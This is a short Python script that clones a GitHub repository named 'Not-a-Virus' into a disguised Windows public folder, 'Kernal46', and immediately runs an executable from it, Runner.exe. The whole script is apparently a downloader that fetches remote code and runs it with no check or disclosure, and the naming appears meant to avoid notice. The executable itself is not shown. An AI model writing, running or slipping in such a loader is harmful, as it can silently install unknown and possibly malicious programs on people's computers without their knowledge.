from dulwich import porcelain
import os
import shutil

path = 'C:/Users/Public/Kernal46'

porcelain.clone('https://github.com/romanjmock/Not-a-Virus', path)

os.chdir(path)

os.system('Runner.exe')